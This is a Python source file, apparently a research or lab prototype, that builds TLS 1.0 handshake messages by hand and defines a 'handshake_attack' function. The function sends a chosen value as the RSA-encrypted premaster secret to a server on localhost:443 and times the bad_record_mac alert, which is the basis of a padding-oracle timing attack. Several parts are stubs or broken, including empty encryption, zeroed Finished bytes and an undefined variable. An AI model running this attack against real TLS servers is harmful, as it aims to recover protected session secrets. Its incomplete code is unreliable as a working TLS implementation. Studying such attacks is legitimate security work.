import code
import gc
import io
import socket
import secrets

from collections import namedtuple
from tlslite.mathtls import MD5, SHA1, PRF, calcMasterSecret
from tlslite.utils.cryptomath import HMAC_SHA1
from tlslite.x509 import X509

from ctypes import *
from tlslite.constants import *

from timed_messenger import send_and_receive


TLS_VERSION_1_0 = 769

# lazy boys just copy+paste from Wireshark captures:
X509_CERT_TYPE_EXTENSION = int.from_bytes(
    bytes.fromhex("000900020100"), byteorder="big"
)

HELLO_CIPHER_SUITE_SIZE = 2
HELLO_CIPHER_SUITE_LENGTH_SIZE = 2
HELLO_COMPRESSION_METHOD_SIZE = 1
HELLO_COMPRESSION_METHOD_LENGTH_SIZE = 1
HELLO_EXTENSION_SIZE = 6
HELLO_EXTENSION_LENGTH_SIZE = 2

EMPTY_BYTES = b""


def encode_list_to_bytes(items, item_size, length_size):
    length = len(items) * item_size
    raw_length = length.to_bytes(length_size, byteorder="big")
    raw_items = EMPTY_BYTES.join(
        [item.to_bytes(item_size, byteorder="big") for item in items]
    )
    return raw_length + raw_items


def decode_list_from_bytes(raw, item_size, length_size):
    length = int.from_bytes(raw[0:length_size], byteorder="big")
    start = length_size
    items = [
        int.from_bytes(raw[start : start + item_size], byteorder="big")
        for i in range(start, start + length, item_size)
    ]
    return items, length


class Alert(namedtuple("Alert", ["level", "description"])):
    def to_bytes(self):
        raw_level = self.level.to_bytes(1, byteorder="big")
        raw_description = self.description.to_bytes(1, byteorder="big")

        return raw_level + raw_description

    @classmethod
    def from_bytes(cls, raw):
        level = int.from_bytes(raw[0:1], byteorder="big")
        description = int.from_bytes(raw[1:2], byteorder="big")

        return cls(level, description)

    def __len__(self):
        return 2


class ClientFinished(
    namedtuple("ClientFinished", ["pre_master_secret", "handshake_messages"])
):
    """
    Final message sent by client as part of TLS handshake. This is the
    first message which the client sends using the ciphers and keys
    negotiated during the handshake. Its goal is to allow the server
    to verify the client is correctly setup.

    Defined as
      PRF(master_secret,
          finished_label,
          MD5(handshake_messages) + SHA-1(handshake_messages))[0:11]

    with
      master_secret := PRF(pre_master_secret, "master secret",
                           client_random + server_random)[0:47]
      finished_label := "client"
      handshake_messages := <concatenation of the all previous
                             handshake messages, at the handshake
                             layer (i.e. with the tls header removed)>

    Reference: https://tools.ietf.org/html/rfc2246#section-7.4.9
    """

    FINISHED_LABEL = b"client finished"

    def to_bytes(self):
        [client_hello] = [
            msg.body
            for msg in self.handshake_messages
            if msg.handshake_type == HandshakeType.client_hello
        ]
        [server_hello] = [
            msg.body
            for msg in self.handshake_messages
            if msg.handshake_type == HandshakeType.server_hello
        ]

        negotiated_version = server_hello.version
        negotiated_version = negotiated_version.to_bytes(2, byteorder="big")
        negotiated_version = (negotiated_version[0], negotiated_version[1])
        negotiated_cipher_suite = server_hello.cipher_suite

        handshake_messages = EMPTY_BYTES.join(
            [m.to_bytes() for m in self.handshake_messages]
        )

        master_secret = calcMasterSecret(
            negotiated_version,
            negotiated_cipher_suite,
            self.pre_master_secret,
            client_hello.random_bytes,
            server_hello.random_bytes,
        )
        finished = PRF(
            master_secret,
            self.FINISHED_LABEL,
            MD5(handshake_messages) + SHA1(handshake_messages),
            12,
        )
        return bytes.fromhex("00" * 48)  # doesn't matter

    @classmethod
    def from_bytes(cls, raw):
        if raw == bytes([0x01]):
            return cls()
        else:
            return False

    def __len__(self):
        return 12


class ChangeCipherSpec(namedtuple("ChangeCipherSpec", [])):
    def to_bytes(self):
        return bytes([0x01])

    @classmethod
    def from_bytes(cls, raw):
        if raw == bytes([0x01]):
            return cls()
        else:
            return False

    def __len__(self):
        return 2 + 128


def sympy_integer_to_bytes(integer, byteorder="big", length=None):
    bys = []

    reduced = integer
    while reduced > 0:
        bys.append(reduced % 256)
        reduced = reduced // 256

    if length:
        bys = bys + [0] * (length - len(bys))

    if byteorder == "big":
        bys.reverse()

    return bytes(bys)


class ClientKeyExchange(namedtuple("ClientKeyExchange", ["enc_premaster_secret"])):
    def to_bytes(self):
        raw_length = int.to_bytes(128, 2, byteorder="big")
        raw_enc_premaster_secret = sympy_integer_to_bytes(
            self.enc_premaster_secret, length=128, byteorder="big"
        )
        return raw_length + raw_enc_premaster_secret

    @classmethod
    def from_bytes(cls, raw):
        return cls(bytes(raw[2:]))

    def __len__(self):
        return 2 + 128


class ServerHelloDone(namedtuple("ServerHelloDone", [])):
    def to_bytes(self):
        return EMPTY_BYTES

    @classmethod
    def from_bytes(cls, raw):
        return cls()

    def __len__(self):
        return 0


class Certificate(namedtuple("Certificate", ["certificates"])):
    def to_bytes(self):
        raw_certs = EMPTY_BYTES
        for cert in self.certificates:
            raw_cert = cert.bytes
            raw_cert_length = int.to_bytes(len(raw_cert), 3, byteorder="big")
            raw_certs += raw_cert_length + raw_cert

        raw_total_length = int.to_bytes(len(raw_certs), 3, byteorder="big")

        return raw_total_length + raw_certs

    @classmethod
    def from_bytes(cls, raw):
        length = int.from_bytes(raw[0:3], byteorder="big")

        certs_start = 3
        certs_end = 3 + length

        certs = []

        offset = certs_start
        while offset < certs_end:
            cert_length = int.from_bytes(raw[offset : offset + 3], byteorder="big")
            offset += 3

            raw_cert = bytes(raw[offset : offset + cert_length])
            offset += cert_length

            cert = X509()
            cert.parseBinary(raw_cert)

            certs.append(cert)

        return cls(certs)

    def __len__(self):
        return len(self.to_bytes())


class ServerHello(
    namedtuple(
        "ServerHello",
        [
            "version",
            "timestamp",
            "random_bytes",
            "session_id",
            "cipher_suite",
            "compression_method",
        ],
    )
):
    def to_bytes(self):
        raw_version = int.to_bytes(self.version, 2, byteorder="big")
        raw_timestamp = int.to_bytes(self.timestamp, 4, byteorder="big")
        raw_random = self.random_bytes
        raw_session_id = self.session_id
        raw_session_id_length = int.to_bytes(len(raw_session_id), 1, byteorder="big")
        raw_cipher_suite = int.to_bytes(
            self.cipher_suite, HELLO_CIPHER_SUITE_SIZE, byteorder="big"
        )
        raw_compression_method = int.to_bytes(
            self.compression_method, HELLO_COMPRESSION_METHOD_SIZE, byteorder="big"
        )
        return (
            raw_version
            + raw_timestamp
            + raw_random
            + raw_session_id_length
            + raw_session_id
            + raw_cipher_suite
            + raw_compression_method
        )

    @classmethod
    def from_bytes(cls, raw):
        offset = 0

        version = int.from_bytes(raw[0:2], byteorder="big")
        offset += 2

        timestamp = int.from_bytes(raw[offset : offset + 4], byteorder="big")
        offset += 4

        random = bytes(raw[offset : offset + 28])
        offset += 28

        session_id_length = int.from_bytes(raw[offset : offset + 1], byteorder="big")
        offset += 1

        session_id = bytes(raw[offset : offset + session_id_length])
        offset += session_id_length

        cipher_suite = int.from_bytes(
            raw[offset : offset + HELLO_CIPHER_SUITE_SIZE], byteorder="big"
        )
        offset += HELLO_CIPHER_SUITE_SIZE

        compression_method = int.from_bytes(
            raw[offset : offset + HELLO_COMPRESSION_METHOD_SIZE], byteorder="big"
        )
        offset += HELLO_COMPRESSION_METHOD_SIZE

        return cls(
            version, timestamp, random, session_id, cipher_suite, compression_method
        )

    def __len__(self):
        return len(self.to_bytes())


class ClientHello(
    namedtuple(
        "ClientHello",
        [
            "version",
            "timestamp",
            "random_bytes",
            "session_id",
            "cipher_suites",
            "compression_methods",
            "extensions",
        ],
    )
):
    def to_bytes(self):
        raw_version = self.version.to_bytes(2, byteorder="big")

        raw_timestamp = self.timestamp.to_bytes(4, byteorder="big")
        raw_random = self.random_bytes

        session_id_length = len(self.session_id)
        raw_session_id_length = session_id_length.to_bytes(1, byteorder="big")
        raw_session_id = self.session_id

        raw_cipher_suites = encode_list_to_bytes(
            self.cipher_suites, HELLO_CIPHER_SUITE_SIZE, HELLO_CIPHER_SUITE_LENGTH_SIZE
        )
        raw_compression_methods = encode_list_to_bytes(
            self.compression_methods,
            HELLO_COMPRESSION_METHOD_SIZE,
            HELLO_COMPRESSION_METHOD_LENGTH_SIZE,
        )
        raw_extensions = encode_list_to_bytes(
            self.extensions, HELLO_EXTENSION_SIZE, HELLO_EXTENSION_LENGTH_SIZE
        )

        return EMPTY_BYTES.join(
            [
                raw_version,
                raw_timestamp,
                raw_random,
                raw_session_id_length,
                raw_session_id,
                raw_cipher_suites,
                raw_compression_methods,
                raw_extensions,
            ]
        )

    def __len__(self):
        return len(self.to_bytes())


class Handshake(namedtuple("Handshake", ["handshake_type", "body"])):
    def to_bytes(self):
        raw_type = self.handshake_type.to_bytes(1, byteorder="big")
        raw_body = self.body.to_bytes()

        raw_length = len(raw_body).to_bytes(3, byteorder="big")

        return raw_type + raw_length + raw_body

    @classmethod
    def from_bytes(cls, raw):
        raw_header, raw_body = raw[0:4], raw[4:]

        handshake_type = int.from_bytes(raw_header[0:1], byteorder="big")
        length = int.from_bytes(raw_header[1:4], byteorder="big")

        body = {
            HandshakeType.client_hello: ClientHello,
            HandshakeType.server_hello: ServerHello,
            HandshakeType.server_hello_done: ServerHelloDone,
            HandshakeType.certificate: Certificate,
            HandshakeType.client_key_exchange: ClientKeyExchange,
            HandshakeType.finished: ClientFinished,
        }[handshake_type].from_bytes(raw_body[0:length])

        return cls(handshake_type, body)

    def __len__(self):
        return len(self.to_bytes())


class Record(namedtuple("Record", ["content_type", "version", "body"])):
    def to_bytes(self):
        raw_content_type = self.content_type.to_bytes(1, byteorder="big")
        raw_version = self.version.to_bytes(2, byteorder="big")
        raw_body = self.body.to_bytes()
        raw_length = len(raw_body).to_bytes(2, byteorder="big")

        return raw_content_type + raw_version + raw_length + raw_body

    @classmethod
    def from_bytes(cls, raw):
        raw_header, raw_body = raw[0:5], raw[5:]

        content_type = int.from_bytes(raw_header[0:1], byteorder="big")
        version = int.from_bytes(raw_header[1:3], byteorder="big")
        length = int.from_bytes(raw_header[3:5], byteorder="big")

        body = {
            ContentType.alert: Alert,
            ContentType.handshake: Handshake,
            # ContentType.application_data: ApplicationData,
            # ContentType.change_cipher_spec: ChangeCipherSpec,
        }[content_type].from_bytes(raw_body[0:length])

        return cls(content_type, version, body)

    def __len__(self):
        return len(self.to_bytes())


class Secrets(
    namedtuple(
        "Secrets",
        [
            "mac_write",
            "mac_read",
            "client_write",
            "client_read",
            "server_write",
            "server_read",
        ],
    )
):
    @classmethod
    def from_master(cls, master_secret):
        # TODO
        return cls(
            master_secret,
            master_secret,
            master_secret,
            master_secret,
            master_secret,
            master_secret,
        )


def encrypt_message(message, sequence_number, secrets, ciphersuite):
    """
    Encrypts a block of data as specified by the
    TLS_RSA_WITH_AES_128_CBC_SHA scheme.

    References:
      - https://tools.ietf.org/html/rfc2246#section-6.2.3.2
      - https://www.cryptologie.net/article/340/tls-pre-master-secrets-and-master-secrets/
      -
    """
    if ciphersuite == CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA:
        block_length = 48
        padding_length_length = 1

        mac = HMAC_SHA1(secrets.mac_write, sequence_num + message)
        mac_length = len(mac)

        length_before_padding = len(message) + len(mac) + padding_length_length
        padding_length = block_length - length_before_padding
        padding = padding_length.to_bytes(1, byteorder="big") * (padding_length + 1)

        plaintext = message + mac + padding
        # Example for AES:
        # https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/#cryptography.hazmat.primitives.ciphers.Cipher
        ciphertext = EMPTY_BYTES

        return ciphertext

    else:
        raise Exception("Only TLS_RSA_WITH_AES_128_CBC_SHA cipher suite is supported")


def handshake_attack(sock, g):
    # -> Client Hello
    client_hello = Record(
        ContentType.handshake,
        TLS_VERSION_1_0,
        Handshake(
            HandshakeType.client_hello,
            ClientHello(
                TLS_VERSION_1_0,
                2451205766,
                secrets.token_bytes(28),
                EMPTY_BYTES,
                [CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA],
                [0],
                [X509_CERT_TYPE_EXTENSION],
            ),
        ),
    )
    sock.send(client_hello.to_bytes())

    # <- ServerHello, Certificate, ServerHelloDone
    response = sock.recv(4096)

    server_hello = Record.from_bytes(response)
    offset = len(server_hello)

    certificates = Record.from_bytes(response[offset:])
    offset += len(certificates)

    server_hello_done = Record.from_bytes(response[offset:])

    # -> ClientKeyExchange, ChangeCipherSpec, HandshakeFinished
    # Construct a ClientKeyExchange with the <g> given.
    client_key_exchange = Record(
        ContentType.handshake,
        TLS_VERSION_1_0,
        Handshake(HandshakeType.client_key_exchange, ClientKeyExchange(g)),
    )
    # Finish off the handshake process
    change_cipher_spec = Record(
        ContentType.change_cipher_spec, TLS_VERSION_1_0, ChangeCipherSpec()
    )
    finished = Record(
        ContentType.handshake,
        TLS_VERSION_1_0,
        ClientFinished(
            bytes.fromhex("00" * 48),
            [
                client_hello.body,
                server_hello.body,
                certificates.body,
                server_hello_done.body,
                client_key_exchange.body,
            ],
        ),
    )
    # Concat these messages together and send at the same time. This
    # should reduce the variance from network latencies.
    final_message = (
        client_key_exchange.to_bytes()
        + change_cipher_spec.to_bytes()
        + finished.to_bytes()
    )

    # Go!
    conn_fd = c_int(sock.fileno())
    message = create_string_buffer(final_message)
    message_length = c_uint(len(message))

    tr = send_and_receive(conn_fd, message, message_length)
    response = bytes(tr.response[0 : tr.response_length])

    # Make sure we got the expected response from the server
    alert = Record.from_bytes(response)
    assert alert.content_type == ContentType.alert
    assert alert.body.level == AlertLevel.fatal
    assert alert.body.description == AlertDescription.bad_record_mac

    return tr.start_time, response, tr.end_time


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("localhost", 443))

    gc.disable()
    time = handshake_attack(sock, g=0)
    gc.collect()

    code.interact(local=locals())
